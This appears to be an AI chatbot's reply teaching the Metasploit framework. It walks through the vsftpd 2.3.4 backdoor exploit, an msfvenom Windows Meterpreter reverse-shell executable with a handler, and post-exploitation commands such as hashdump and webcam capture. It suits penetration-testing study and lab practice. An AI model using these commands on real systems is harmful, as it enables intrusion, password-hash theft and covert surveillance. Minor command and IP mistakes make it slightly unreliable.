Great — let’s focus purely on **Metasploit** in full detail now — clean, organized, and practical. Here’s your complete Metasploit theory + command guide:

---

# 📖 Metasploit Framework — Complete Guide

---

## 🔍 What is Metasploit?  
**Metasploit Framework** is a powerful, open-source penetration testing tool widely used for:
- **Finding vulnerabilities**
- **Exploiting systems**
- **Creating and delivering payloads**
- **Post-exploitation tasks**
- **Security research and learning**

It helps ethical hackers and security researchers test the security of systems and networks.

---

## 🛠️ Components of Metasploit  
| Component         | Description                                                  |
|:------------------|:--------------------------------------------------------------|
| **msfconsole**      | The main command-line interface of Metasploit |
| **msfvenom**         | A tool to generate custom payloads |
| **Exploits**         | Modules to exploit system vulnerabilities |
| **Payloads**         | Code executed on the target system after successful exploitation |
| **Auxiliary Modules**| Tools for scanning, fuzzing, sniffing, and DoS |
| **Post Modules**     | Actions executed after exploiting a system (gather info, maintain access) |
| **Meterpreter**      | An advanced post-exploitation shell |

---

## 🎛️ Metasploit Workflow  

1. **Start Database & Metasploit**
   ```bash
   sudo systemctl start postgresql
   msfconsole
   ```

2. **Search for a Vulnerability**
   ```bash
   search vsftpd
   ```

3. **Select an Exploit**
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

4. **Show Required Options**
   ```bash
   show options
   ```

5. **Set Target Host**
   ```bash
   set RHOST 192.168.1.10
   set RPORT 21
   ```

6. **Select and Set a Payload**
   ```bash
   set payload cmd/unix/interact
   ```

7. **Run the Exploit**
   ```bash
   exploit
   ```

---

## 🎯 Payloads in Metasploit  

| Payload Type                 | Description                        |
|:-----------------------------|:------------------------------------|
| `windows/meterpreter/reverse_tcp` | Creates a Meterpreter session back to the attacker's machine |
| `linux/x86/meterpreter/reverse_tcp` | Reverse shell payload for Linux systems |
| `android/meterpreter/reverse_tcp` | Reverse shell for Android devices |
| `cmd/unix/reverse` | Unix reverse shell |

### 📦 Example — Generate a Payload (with `msfvenom`)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```
- `-p` → Payload type  
- `LHOST` → Local (attacker’s) IP  
- `LPORT` → Listening port  
- `-f` → Format (exe, elf, apk)

---

## 🎮 Using Multi/Handler to Catch a Reverse Shell  
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

---

## 📑 Post-Exploitation (Meterpreter)

Once the target is compromised:

| Command               | Description                    |
|:----------------------|:--------------------------------|
| `sysinfo`               | Show system info               |
| `getuid`                | Show current user              |
| `shell`                 | Drop into a command shell      |
| `download file`         | Download files from target     |
| `upload file`           | Upload files to target         |
| `screenshot`            | Take a screenshot of the target |
| `webcam_snap`           | Capture webcam image           |
| `hashdump`              | Dump password hashes           |

---

## 📚 Common Metasploit Commands  

| Command                    | Purpose                    |
|:----------------------------|:----------------------------|
| `help`                       | Show all commands |
| `search <keyword>`            | Search for modules |
| `use <module>`                | Load a module |
| `show payloads`               | List compatible payloads |
| `show options`                | Show module options |
| `set <option> <value>`        | Set a required option |
| `exploit` or `run`            | Launch exploit |

---

## 📊 Example Attack Scenario (FTP Backdoor Exploit)

**Steps:**
1. Start Metasploit  
   `msfconsole`
2. Search for exploit  
   `search vsftpd`
3. Use exploit  
   `use exploit/unix/ftp/vsftpd_234_backdoor`
4. Set target IP  
   `set RHOST 192.168.1.10`
5. Run  
   `exploit`

**If successful → shell access granted.**

---

## 📝 Summary Table  

| Step                     | Command                      |
|:--------------------------|:------------------------------|
| Start services              | `sudo systemctl start postgresql` |
| Launch Metasploit            | `msfconsole` |
| Search exploit              | `search <keyword>` |
| Use exploit                 | `use <exploit-path>` |
| Set options                 | `set RHOST <target>` etc. |
| Show options                | `show options` |
| Set payload                 | `set payload <payload>` |
| Run exploit                 | `exploit` |
| Open Meterpreter session    | `session -i <ID>` |
| Run post-exploitation tools | `sysinfo`, `screenshot` etc. |

---

## 🎯 Why Metasploit is So Important  
✅ Largest exploit database  
✅ Versatile — works on Linux, Windows, Android  
✅ Supports custom payloads and modules  
✅ Great for **ethical hacking**, **pentesting labs**, **CTFs**

---

If you’d like — I can also create:
- 📄 A **Markdown cheat sheet**
- 📝 A **PDF handbook**
- 🖥️ A **Metasploit lab guide** for practice  

Want me to build one for you? 🚀